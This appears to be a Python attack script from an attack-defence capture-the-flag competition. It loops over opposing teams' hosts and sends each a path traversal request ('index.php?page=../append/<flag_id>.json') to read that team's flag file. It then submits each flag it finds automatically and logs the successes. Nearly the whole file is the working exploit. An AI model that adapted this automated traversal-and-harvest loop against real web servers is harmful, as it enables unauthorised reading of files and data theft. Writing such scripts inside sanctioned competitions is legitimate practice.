#!/usr/bin/python
# -*- coding: utf-8 -*-
import time
import datetime
import requests
import json
from class_saywhat_api import *


def main():
    # Initialize API wrapper
    api = ProjectCTFAPI()
    # Turn on debug mode to see flag submission status
    api.debug = True
    # Get target info by serviceID
    serviceID = 2
    targets = api.getTargets(serviceID)
    for target in targets:
        # Generatae HTTP GET Request
        httpGetStr = 'http://' + target['hostname'] + ':' \
                     + str(target['port']) + '/index.php?page=../append/' \
                     + target['flag_id'] + '.json'
        try:
            # print(target['hostname'], target['team_name'], target['flag_id'])
            r = requests.get(httpGetStr, timeout=0.5)
            if 'FLG' in r.text:
                # convert to json format and encode utf-8 to ascii
                r_dict = r.json()
                flag = r_dict['message']
                # submit flag
                api.submitFlag(flag)
                with open("/home/ctf/saywhat_main.log", "a") as myfile:
                    myfile.write(f"\nSuccess - {datetime.datetime.now()}")
        except requests.exceptions.ReadTimeout:
            print('Timeout on', target['hostname'],
                  target['team_name'])
            continue


if __name__ == '__main__':
    main()